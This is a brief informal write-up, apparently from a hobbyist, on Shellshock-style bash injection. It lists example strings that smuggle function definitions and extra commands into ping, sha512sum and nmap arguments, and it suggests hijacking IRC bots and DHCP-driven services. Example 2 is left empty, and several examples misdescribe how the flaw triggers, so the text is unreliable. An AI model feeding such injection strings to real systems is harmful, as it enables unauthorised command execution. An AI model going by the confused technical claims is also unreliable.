Shellshock*

If you can get a device to ping, hash, or execute a command with a custom string you can execute commands on said device.

Example 1:

ping () { :; };{ echo #rekt; }

Example 2:

ping -c 

Example 3: 

Get a device to hash a file:

sha512sum /usr/bin/gpg|:() { :; };{ echo urmum; };.txt

Example 4:

nmap -sV 127.0.0.1|:() { :; };{ echo example; }

While many of these are not applicable in day to day practice, it is possible to hijack IRC bots that have direct interfaces with bash(
ie ping) or devices that use bash to hash or decode files.

It may also be possible to to execute commands via DHCP configuration, some services, and basically everything else that interacts with bash
and accepts custom variables(essentially the same as shellshock).

